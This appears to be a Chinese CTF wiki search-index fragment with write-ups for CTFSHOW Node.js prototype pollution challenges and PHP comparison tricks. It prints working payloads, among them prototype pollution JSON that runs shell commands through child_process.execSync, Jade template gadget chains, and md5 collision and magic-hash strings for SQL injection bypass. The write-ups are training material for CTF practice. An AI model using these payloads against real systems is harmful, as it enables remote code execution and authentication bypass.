\uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u901a\u8fc7\u539f\u578b\u6c61\u67d3\u653b\u51fb\u7ed9\u5b83\u8d4b\u4efb\u610f\u6211\u4eec\u60f3\u8981\u7684\u503c\u4f1a\u600e\u6837\uff1f\uff1f\u5c82\u4e0d\u662f\u53ef\u4ee5\u968f\u610f\u6267\u884c\u4ee3\u7801\u8fdb\u884cRCE\u4e86 \u9996\u5148\u7ed9\u51fa\u6211\u7684payload\u5427\uff0c\u5f53\u7136\u5acc\u9ebb\u70e6\u7684\u8bdd\u91cc\u9762\u53ef\u4ee5\u641e\u6210\u53cd\u5f39shell\u7684\uff0c\u770b\u81ea\u5df1 {\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').execSync('cat routes/login.js');\"}} \u901a\u8fc7\u8c03\u8bd5\u6211\u53d1\u73b0\u6c61\u67d3\u5230\u4e86this,\u5728nodejs\u5f53\u4e2d\u5176\u6307\u5411module.exports\uff0c\u6700\u5916\u5c42\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6307\u5411global\uff0c\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u77e5\u9053\uff0c\u672a\u6765\u5e0c\u671b\u80fd\u591f\u7834\u89e3\uff0c\u6682\u65f6\u6c34\u5e73\u53d7\u9650\uff0c\u53cd\u6b63\u770b\u5230query\u5230\u4e86\u5168\u5c40\u53d8\u91cf\u91cc\u9762 \u4e4b\u540e\u6211\u4eec\u524d\u5f80 url/api \u754c\u9762\u53d1\u8d77post\u5305\u5373\u53ef\u83b7\u5f97flag Web342-343 \u00b6 \u8fd9\u662f\u6211\u7684exp\uff0c\u8fc7\u7a0b\u4e0d\u8bb2\u81ea\u5df1\u7814\u7a76 {\"__proto__\":{\"__proto__\": {\"type\":\"Code\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );jade_debug.unshift(new jade.DebugItem(0\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"MixinBlock\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"Doctype\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"Doctype\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('calc');//\"}}} Web344 \u00b6 \u4ee3\u7801\u5ba1\u8ba1\uff0c\u9700\u8981query\u5f53\u4e2d\u7684name\uff0cpassword\u4e0eisVIP\u7b26\u5408\u6761\u4ef6\uff0c\u672c\u6765\u4f20\u5165 query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true} \u5373\u53ef\u4f46\u662f\u8fd9\u9053\u9898\u8fc7\u6ee4\u4e862c\u4e5f\u5c31\u8fc7\u6ee4\u4e86 %2c(\u9017\u53f7) (req.url\u83b7\u53d6\u7684\u503c\u662furl\u7f16\u7801\u540e\u7684\u6240\u4ee5\u9017\u53f7\u4f1a\u53d8\u6210%2c) router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); } }); Nodejs\u7684\u4e00\u4e2a\u5c0f\u7279\u6027\u5427\uff0c\u8fd9\u6837\u4ed6\u4f1a\u628a\u4e09\u4e2a\u90e8\u5206\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u8fd9\u6837\u4e5f\u5c31\u6ee1\u8db3\u4e86\u9898\u76ee\u7684\u6761\u4ef6\u4e5f\u5f97\u5230\u4e86flag \u7531\u4e8e\"\u7684url\u7f16\u7801\u4e3a%22\u4e0ec\u53c8\u5408\u6210\u4e862c\u6240\u4ee5c\u9700\u8981\u7f16\u7801 query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/#_1","text":"","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/#web338","text":"\u9996\u5148\u4ece\u5165\u53e3\u6587\u4ef6\u770b\u8d77\uff0c app.js \uff0c\u53d1\u73b0\u4e24\u4e2a\u5173\u952e\u8def\u5f84 app . use ( '/' , indexRouter ); app . use ( '/login' , loginRouter ); \u5f53\u7136\u4e3b\u9875\u5c31\u4e0d\u7528\u770b\u4e86\uff0c\u76f4\u63a5\u770b\u5173\u952e\u90e8\u5206\uff0clogin\uff0c\u4ece\u5f53\u4e2d\u6211\u4eec\u4e0d\u96be\u5f97\u51fa\u9700\u8981\u8ba9 secert.ctfshow==='36dboy' \u5373\u53ef\u83b7\u53d6flag\uff0c\u8fd9\u91cc\u5f88\u7b80\u5355\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u561b /* GET home page. */ router . post ( '/' , require ( 'body-parser' ). json (), function ( req , res , next ) { res . type ( 'html' ); var flag = 'flag_here' ; var secert = {}; var sess = req . session ; let user = {}; utils . copy ( user , req . body ); if ( secert . ctfshow === '36dboy' ){ res . end ( flag ); } else { return res . json ({ ret_code : 2 , ret_msg : '\u767b\u5f55\u5931\u8d25' + JSON . stringify ( user )}); } }); \u5176\u4e2d\u6d89\u53ca\u5230\u8fd9\u4e00\u90e8\u5206\u7684\u5229\u7528\u51fd\u6570\u5c31\u662f copy \uff0c\u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u8c03\u7528\u51fd\u6570\uff0cfor\u5faa\u73af\u904d\u5386object2\u5f53\u4e2d\u7684key(\u952e)\uff0c\u5982\u679c\u8fd9\u4e2a\u952e\u5728object1\u4e0eobject2\u5f53\u4e2d\u90fd\u5b58\u5728\uff0c\u5219\u8c03\u7528 copy(object1[key], object2[key]) ,\u5426\u5219\u8ba9 object1[key] = object2[key] function copy ( object1 , object2 ){ for ( let key in object2 ) { if ( key in object2 && key in object1 ) { copy ( object1 [ key ], object2 [ key ]) } else { object1 [ key ] = object2 [ key ] } } } \u90a3\u5982\u679c\u6211\u4eec\u8ba9 object2 \u4e3a {\"__proto__\":{\"ctfshow\":\"36dboy\"}} \u4f1a\u53d1\u751f\u4ec0\u4e48\uff08\u6ce8\u610f\u672c\u9898\u5f53\u4e2dobject1\u4e3asecret\u53d8\u91cf\uff09 \u7531\u4e8e object1\u548cobject2 \u7684\u5bf9\u8c61\u90fd\u5177\u6709\u5c5e\u6027 __proto__ ,\u8fdb\u5165if\u8bed\u53e5\u4e3atrue\uff0c\u6267\u884c copy(object1[__proto__], object2[__proto__]) \u6b64\u65f6 let key in object2 \u7684 key \u4e3a ctfshow \u5f88\u660e\u663eobject1\u5f53\u4e2d\u6ca1\u6709\uff0c\u6240\u4ee5\u8fdb\u5165else\u90e8\u5206 object1[ctfshow] = object2[ctfshow] \uff0c\u6210\u529f\u8d4b\u503c\u4e3a 36dboy Burpsuite\u53d1\u9001\u8bf7\u6c42\u5305\u5373\u53ef\u83b7\u53d6flag POST /login HTTP/1.1 Host: 4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show Content-Length: 34 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Content-Type: application/json Origin: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show Referer: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: UM_distinctid=176b20985423e8-07d414625df175-3323765-144000-176b209854358f Connection: close {\"__proto__\":{\"ctfshow\":\"36dboy\"}}","title":"Web338"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/#web339","text":"\u8fd9\u9053\u9898\u5f00\u59cb\u9ebb\u70e6\u8d77\u6765\u4e86\uff0c\u5148\u6765\u5206\u6790\u601d\u8def\uff0c\u9996\u5148\u5217\u51fa\u672c\u9898\u5229\u7528\u6240\u9700\u8981\u7684\u5173\u952e\u4ee3\u7801 \u9996\u5148\u662flogin.js /* GET home page. */ router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow===flag){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'+JSON.stringify(user)}); } }); \u4e4b\u540e\u662fapi.js var express = require('express'); var router = express.Router(); var utils = require('../utils/common'); // var query = \"return global.process.mainModule.constructor._load('child_process').execSync('whoami');\"; /* GET home page. */ router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); module.exports = router; \u6211\u4eec\u53d1\u73b0\u5728api.js\u5f53\u4e2d Function\u91cc\u7684query\u53d8\u91cf\u6ca1\u6709\u88ab\u5f15\u7528 \uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u901a\u8fc7\u539f\u578b\u6c61\u67d3\u653b\u51fb\u7ed9\u5b83\u8d4b\u4efb\u610f\u6211\u4eec\u60f3\u8981\u7684\u503c\u4f1a\u600e\u6837\uff1f\uff1f\u5c82\u4e0d\u662f\u53ef\u4ee5\u968f\u610f\u6267\u884c\u4ee3\u7801\u8fdb\u884cRCE\u4e86 \u9996\u5148\u7ed9\u51fa\u6211\u7684payload\u5427\uff0c\u5f53\u7136\u5acc\u9ebb\u70e6\u7684\u8bdd\u91cc\u9762\u53ef\u4ee5\u641e\u6210\u53cd\u5f39shell\u7684\uff0c\u770b\u81ea\u5df1 {\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').execSync('cat routes/login.js');\"}} \u901a\u8fc7\u8c03\u8bd5\u6211\u53d1\u73b0\u6c61\u67d3\u5230\u4e86this,\u5728nodejs\u5f53\u4e2d\u5176\u6307\u5411module.exports\uff0c\u6700\u5916\u5c42\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6307\u5411global\uff0c\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u77e5\u9053\uff0c\u672a\u6765\u5e0c\u671b\u80fd\u591f\u7834\u89e3\uff0c\u6682\u65f6\u6c34\u5e73\u53d7\u9650\uff0c\u53cd\u6b63\u770b\u5230query\u5230\u4e86\u5168\u5c40\u53d8\u91cf\u91cc\u9762 \u4e4b\u540e\u6211\u4eec\u524d\u5f80 url/api \u754c\u9762\u53d1\u8d77post\u5305\u5373\u53ef\u83b7\u5f97flag","title":"Web339"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/#web342-343","text":"\u8fd9\u662f\u6211\u7684exp\uff0c\u8fc7\u7a0b\u4e0d\u8bb2\u81ea\u5df1\u7814\u7a76 {\"__proto__\":{\"__proto__\": {\"type\":\"Code\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );jade_debug.unshift(new jade.DebugItem(0\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"MixinBlock\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"Doctype\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//\"}}} {\"__proto__\":{\"__proto__\": {\"type\":\"Doctype\",\"compileDebug\":1,\"self\":1,\"line\":\"0, \\\"\\\" ));return global.process.mainModule.constructor._load('child_process').execSync('calc');//\"}}}","title":"Web342-343"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/#web344","text":"\u4ee3\u7801\u5ba1\u8ba1\uff0c\u9700\u8981query\u5f53\u4e2d\u7684name\uff0cpassword\u4e0eisVIP\u7b26\u5408\u6761\u4ef6\uff0c\u672c\u6765\u4f20\u5165 query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true} \u5373\u53ef\u4f46\u662f\u8fd9\u9053\u9898\u8fc7\u6ee4\u4e862c\u4e5f\u5c31\u8fc7\u6ee4\u4e86 %2c(\u9017\u53f7) (req.url\u83b7\u53d6\u7684\u503c\u662furl\u7f16\u7801\u540e\u7684\u6240\u4ee5\u9017\u53f7\u4f1a\u53d8\u6210%2c) router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); } }); Nodejs\u7684\u4e00\u4e2a\u5c0f\u7279\u6027\u5427\uff0c\u8fd9\u6837\u4ed6\u4f1a\u628a\u4e09\u4e2a\u90e8\u5206\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u8fd9\u6837\u4e5f\u5c31\u6ee1\u8db3\u4e86\u9898\u76ee\u7684\u6761\u4ef6\u4e5f\u5f97\u5230\u4e86flag \u7531\u4e8e\"\u7684url\u7f16\u7801\u4e3a%22\u4e0ec\u53c8\u5408\u6210\u4e862c\u6240\u4ee5c\u9700\u8981\u7f16\u7801 query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}","title":"Web344"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/","text":"\u51fd\u6570Tricks \u00b6 is_numeric \u00b6 \u8fd9\u4e2a\u51fd\u6570\u5c31\u4e0d\u5fc5\u591a\u8bf4\u4e86\uff0c\u597d\u5427\u61c2\u82f1\u8bed\u4f60\u5c31\u61c2\u4e86\uff01\uff01\uff01 \u6765\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5 for ($i=0; $i <128 ; $i++) { $x=chr($i).'1'; if(is_numeric($x)==true){ echo urlencode(chr($i)).\"\\n\"; } } \u53d1\u73b0\u4e0b\u9762\u8fd9\u4e9b\u90fd\u662f\u6d4b\u8bd5\u901a\u8fc7\u7684\u5b57\u7b26 %09---\u6c34\u5e73\u5b9a\u4f4d\u7b26\u53f7 %0A---\u6362\u884c\u952e %0B---\u5782\u76f4\u5b9a\u4f4d\u7b26\u53f7 %0C---\u6362\u9875\u952e %0D---\u5f52\u4f4d\u952e %2B---\u5c31\u662f\u52a0\u53f7 %20---\u7a7a\u683c - + . \u4f46\u662f\u8fd9\u4e2a\u4e0d\u662f\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u914d\u5408\u5176\u4ed6\u51fd\u6570\u641e\u4e8b\u60c5\uff0c\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50trim\u5c31\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50 trim\u4e0eis_numeric \u00b6 \u9996\u5148\u642c\u8fd0\u5de5\u642c\u8fd0\u4e00\u4e0b\u5b98\u7f51\u7684\u4ecb\u7ecd \u8bed\u6cd5 trim(string,charlist) \u53c2\u6570 \u63cf\u8ff0 string \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u68c0\u67e5\u7684\u5b57\u7b26\u4e32\u3002 charlist \u53ef\u9009\u3002\u89c4\u5b9a\u4ece\u5b57\u7b26\u4e32\u4e2d\u5220\u9664\u54ea\u4e9b\u5b57\u7b26\u3002\u5982\u679c\u7701\u7565\u8be5\u53c2\u6570\uff0c\u5219\u79fb\u9664\u4e0b\u5217\u6240\u6709\u5b57\u7b26\uff1a \"\\0\" - NULL \"\\t\" - \u5236\u8868\u7b26 \"\\n\" - \u6362\u884c \"\\x0B\" - \u5782\u76f4\u5236\u8868\u7b26 \"\\r\" - \u56de\u8f66 \" \" - \u7a7a\u683c \u5e76\u4e14\u5982\u679c\u4f60\u60f3\u77e5\u9053\u6709\u54ea\u4e9b\u4e5f\u53ef\u4ee5\u8fd0\u884c\u770b\u770b for ($i=0; $i <=128 ; $i++) { $x=chr($i).'1'; if(trim($x)!=='1' && is_numeric($x)){ echo urlencode(chr($i)).\"\\n\"; } } \u53d1\u73b0\u9664\u4e86+-.\u53f7\u4ee5\u5916\u8fd8\u6709\u53ea\u5269\u4e0b%0c\u4e5f\u5c31\u662f\u6362\u9875\u7b26\u4e86 \u6765\u770b\u4e00\u9053ctf\u9898\u76ee function filter($num){ $num=str_replace(\"0x\",\"1\",$num); $num=str_replace(\"0\",\"1\",$num); $num=str_replace(\".\",\"1\",$num); $num=str_replace(\"e\",\"1\",$num); $num=str_replace(\"+\",\"1\",$num); return $num; } $num=$_GET['num']; if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ if($num=='36'){ echo $flag; }else{ echo \"hacker!!\"; } }else{ echo \"hacker!!!\"; } payload:num=%0c36 preg_match \u00b6 \u6570\u7ec4\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 if(preg_match(\"/[0-9]/\", $num)){ die(\"no no no!\"); } \u5b98\u65b9\u6587\u6863\u4e2d\u4ecb\u7ecd\u5982\u4e0b\uff1a preg_match()\u8fd4\u56de pattern \u7684\u5339\u914d\u6b21\u6570\u3002 \u5b83\u7684\u503c\u5c06\u662f0\u6b21\uff08\u4e0d\u5339\u914d\uff09\u62161\u6b21 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u4e0d\u6309\u89c4\u5b9a\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fd4\u56defalse\uff0c\u4ece\u800c\u4e0d\u4f1a\u8fdb\u5165if\uff0c\u8fbe\u5230\u7ed5\u8fc7\u7684\u6548\u679c\u3002 payload:num[]=1 \u6b63\u5219\u8868\u8fbe\u5f0f\u4fee\u9970\u7b26 \u00b6 \u9996\u5148\u8bf4\u660e\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u6a21\u5f0f\uff1a \\i \u4e0d\u533a\u5206(ignore)\u5927\u5c0f\u5199 \\m \u591a(more)\u884c\u5339\u914d \u82e5\u5b58\u5728\u6362\u884c\\n\u5e76\u4e14\u6709\u5f00\u59cb^\u6216\u7ed3\u675f$\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c \u5c06\u4ee5\u6362\u884c\u4e3a\u5206\u9694\u7b26\uff0c\u9010\u884c\u8fdb\u884c\u5339\u914d $str = \"abc\\nabc\"; $preg = \"/^abc$/m\"; preg_match($preg, $str,$matchs); \u8fd9\u6837\u5176\u5b9e\u662f\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\uff0c\u56e0\u4e3a\u5339\u914d\u7684\u65f6\u5019 \u5148\u662f\u5339\u914d\u6362\u884c\u7b26\u524d\u9762\u7684\uff0c\u63a5\u7740\u5339\u914d\u6362\u884c\u7b26\u540e\u9762\u7684\uff0c\u4e24\u4e2a\u90fd\u662fabc\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \\s \u7279\u6b8a\u5b57\u7b26\u5706\u70b9 . \u4e2d\u5305\u542b\u6362\u884c\u7b26 \u9ed8\u8ba4\u7684\u5706\u70b9 . \u662f\u5339\u914d\u9664\u6362\u884c\u7b26 \\n \u4e4b\u5916\u7684\u4efb\u4f55\u5355\u5b57\u7b26\uff0c\u52a0\u4e0as\u4e4b\u540e, .\u5305\u542b\u6362\u884c\u7b26 $str = \"abggab\\nacbs\"; $preg = \"/b./s\"; preg_match_all($preg, $str,$matchs); \u8fd9\u6837\u5339\u914d\u5230\u7684\u6709\u4e09\u4e2a bg b\\n bs \\A \u5f3a\u5236\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u5f00\u5934\u5339\u914d; \\D \u5982\u679c\u4f7f\u7528$\u9650\u5236\u7ed3\u5c3e\u5b57\u7b26,\u5219\u4e0d\u5141\u8bb8\u7ed3\u5c3e\u6709\u6362\u884c; \\e \u914d\u5408\u51fd\u6570preg_replace()\u4f7f\u7528, \u53ef\u4ee5\u628a\u5339\u914d\u6765\u7684\u5b57\u7b26\u4e32\u5f53\u4f5c\u6b63\u5219\u8868\u8fbe\u5f0f\u6267\u884c; \u6240\u4ee5\u53ef\u4ee5\u8fdb\u884crce \u6211\u4eec\u6765\u5206\u6790\u4e0b\u561b\u8fd9\u4e00\u9053\u9898 $a=$_GET['cmd']; if(preg_match('/^php$/im', $a)){ if(preg_match('/^php$/i', $a)){ echo 'hacker'; } else{ echo $flag; } } payload:cmd=%0aphp %0aphp \u7ecf\u8fc7\u7b2c\u4e00\u4e2a\u5339\u914d\u65f6\uff0c\u4ee5\u6362\u884c\u7b26\u4e3a\u5206\u5272\u4e5f\u5c31\u662f%0a\uff0c\u524d\u9762\u56e0\u4e3a\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u53ea\u5339\u914d\u6362\u884c\u7b26\u540e\u9762\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u3002 \u7ecf\u8fc7\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f%0aphp \u4e0d\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4ee5php\u5f00\u5934\u4ee5php\u7ed3\u5c3e\u3002\u6240\u4ee5\u65e0\u6cd5\u901a\u8fc7\uff0c\u6700\u540e\u8f93\u51faflag Int_val \u00b6 \u5b98\u65b9\u6587\u6863\u4ecb\u7ecd\u5982\u4e0b\uff1a intval ( mixed $var [, int $base = 10 ] ) : int Note: \u5982\u679c base \u662f 0\uff0c\u901a\u8fc7\u68c0\u6d4b var \u7684\u683c\u5f0f\u6765\u51b3\u5b9a\u4f7f\u7528\u7684\u8fdb\u5236\uff1a \u5982\u679c\u5b57\u7b26\u4e32\u5305\u62ec\u4e86 \"0x\" (\u6216 \"0X\") \u7684\u524d\u7f00\uff0c\u4f7f\u7528 16 \u8fdb\u5236 (hex)\uff1b\u5426\u5219\uff0c \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 \"0\" \u5f00\u59cb\uff0c\u4f7f\u7528 8 \u8fdb\u5236(octal)\uff1b\u5426\u5219\uff0c \u5c06\u4f7f\u7528 10 \u8fdb\u5236 (decimal)\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5 intval('4476.0')===4476 \u5c0f\u6570\u70b9 intval('+4476.0')===4476 \u6b63\u8d1f\u53f7 intval('4476e0')===4476 \u79d1\u5b66\u8ba1\u6570\u6cd5 intval('0x117c')===4476 16\u8fdb\u5236 intval('010574')===4476 8\u8fdb\u5236 intval(' 010574')===4476 8\u8fdb\u5236+\u7a7a\u683c \u4e0b\u9762\u8fd9\u9053\u9898\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684payload\u6267\u884c\uff1a if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } Hash\u6bd4\u8f83\u7f3a\u9677 \u00b6 md5\u5904\u7406\u6570\u7ec4 \u00b6 if (isset($_POST['a']) and isset($_POST['b'])) { if ($_POST['a'] != $_POST['b']) if (md5($_POST['a']) === md5($_POST['b'])) echo $flag; } \u539f\u56e0\uff1amd5()\u51fd\u6570\u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u679c\u4f20\u5165\u7684\u4e3a\u6570\u7ec4\uff0c\u4f1a\u8fd4\u56deNULL\uff0c\u6240\u4ee5\u4e24\u4e2a\u6570\u7ec4\u7ecf\u8fc7\u52a0\u5bc6\u540e\u5f97\u5230\u7684\u90fd\u662fNULL,\u4e5f\u5c31\u662f\u5f3a\u76f8\u7b49\u7684\u3002 Sha1\u5904\u7406\u6570\u7ec4 \u00b6 \u548c\u4e0a\u9762\u4e00\u6837\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u66f4\u591a\u662f\u8bb0\u5f55\u4e00\u4e0b\u5f31\u6bd4\u8f83\u65f6\u53ef\u7528\u7684\u5b57\u7b26\u4e32 aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m md5 \u00b6 md5\u5f31\u6bd4\u8f83(==\u6bd4\u8f83\u6f0f\u6d1e) \u00b6 \u5982\u679c\u4e24\u4e2a\u5b57\u7b26\u7ecfMD5\u52a0\u5bc6\u540e\u7684\u503c\u4e3a 0exxxxx\u5f62\u5f0f\uff0c\u5c31\u4f1a\u88ab\u8ba4\u4e3a\u662f\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u4e14\u8868\u793a\u7684\u662f0*10\u7684xxxx\u6b21\u65b9\uff0c\u8fd8\u662f\u96f6\uff0c\u90fd\u662f\u76f8\u7b49\u7684\u3002 \u4e0b\u5217\u7684\u5b57\u7b26\u4e32\u7684MD5\u503c\u90fd\u662f0e\u5f00\u5934\u7684\uff1a QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a \u8fd9\u91cc\u518d\u5206\u4eab\u4e00\u7bc7\u6211\u4ee5\u524d\u8bb0\u5f55\u7684WP\uff1a \u8bb0\u5f55\u4ee5\u540e\u53ef\u80fd\u7528\u5230\u7684MD5 \u8fd9\u91cc\u518d\u8865\u5145\u4e00\u9053\u9898 $a=(string)$a; $b=(string)$b; if( ($a!==$b) && (md5($a)==md5($b)) ){ echo $flag; } md5\u5f31\u6bd4\u8f83\uff0c\u4e3a0e\u5f00\u5934\u7684\u4f1a\u88ab\u8bc6\u522b\u4e3a\u79d1\u5b66\u8bb0\u6570\u6cd5\uff0c\u7ed3\u679c\u5747\u4e3a0\uff0c\u6240\u4ee5\u53ea\u9700\u627e\u4e24\u4e2amd5\u540e\u90fd\u4e3a0e\u5f00\u5934\u4e140e\u540e\u9762\u5747\u4e3a\u6570\u5b57\u7684\u503c\u5373\u53ef\u3002 payload: a=QNKCDZO&b=240610708 md5\u5f3a\u78b0\u649e \u00b6 $a=(string)$a; $b=(string)$b; if( ($a!==$b) && (md5($a)===md5($b)) ){ echo $flag; } \u8fd9\u65f6\u5019\u9700\u8981\u627e\u5230\u4e24\u4e2a\u771f\u6b63\u7684md5\u503c\u76f8\u540c\u6570\u636e a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 \u56fd\u5916\u6709\u4e2a\u7f51\u7ad9\u4e5f\u6709\u4e00\u4e9b\u6536\u96c6\u7684\u8d44\u6599\uff1a md5\u5f3a\u78b0\u649e\u6536\u96c6 md5($str,true)\u7c7b\u578b\u7ed5\u8fc7 \u00b6 $sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\"; \u5c06\u5bc6\u7801\u8f6c\u6362\u621016\u8fdb\u5236\u7684hex\u503c\u4ee5\u540e\uff0c\u518d\u5c06\u5176\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u540e\u5305\u542b\u2019 \u2018or \u2019 6\u2019 SELECT * FROM admin WHERE pass=\u2019 \u2018or \u2019 6\u2019 \u5f88\u660e\u663e\u53ef\u4ee5\u6ce8\u5165\u4e86\u3002 \u96be\u70b9\u5c31\u5728\u5982\u4f55\u5bfb\u627e\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\uff0c\u7f51\u4e0a\u6709 \u63d0\u4f9b\u4e24\u4e2a\u5b57\u7b26\u4e32\uff1a ffifdyop\u3001129581926211651571912466741651878684928 \u4f46\u9898\u76ee\u6709\u957f\u5ea6\u9650\u5236\uff0c\u6240\u4ee5\u8f93\u5165ffifdyop\u5373\u53ef\u83b7\u53d6flag \u518d\u8f6c\u6210\u5b57\u7b26\u4e32:\u2019 \u2019 \u2018or\u2019 6 \u89e3\u6790:\u5b58\u5728 or 